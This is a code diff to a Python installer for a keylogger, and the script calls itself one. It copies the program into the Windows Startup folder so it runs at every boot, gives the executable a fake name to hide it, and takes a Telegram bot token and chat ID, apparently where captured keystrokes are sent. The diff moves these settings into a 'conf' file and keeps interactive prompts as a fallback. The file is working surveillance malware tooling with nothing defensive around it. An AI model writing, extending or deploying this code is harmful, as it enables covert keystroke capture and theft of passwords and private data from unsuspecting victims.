@@ -2,7 +2,8 @@ import getpass
 import os
 import shutil
 
-def install():
+
+def install(token, chatid, fakename):
     code = []
     with open('main.py') as file:
         while True:
@@ -13,9 +14,6 @@ def install():
 
     path = f'C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
 
-    token = input('Input tgbot token\n>>')
-    chatid = input('Input chatID\n>>')
-    fakename = input('Input exe file name\n>>')
     if fakename == '':
         fakename = 'main'
 
@@ -49,4 +47,20 @@ def install():
     a = input('\nKeylogger installed successfully! :D\nPress enter to continue.')
 
 if __name__ == '__main__':
-    install()
+    
+    try:
+        with open('conf') as file:
+            conf = file.read()
+
+        conf = conf.split('\n')    
+    
+        token = conf[0]
+        chatid = conf[1]
+        fakename = conf[2]
+
+    except BaseException:    
+        token = input('Input tgbot token\n>>')
+        chatid = input('Input chatID\n>>')
+        fakename = input('Input exe file name\n>>')
+    
+    install(token, chatid, fakename)
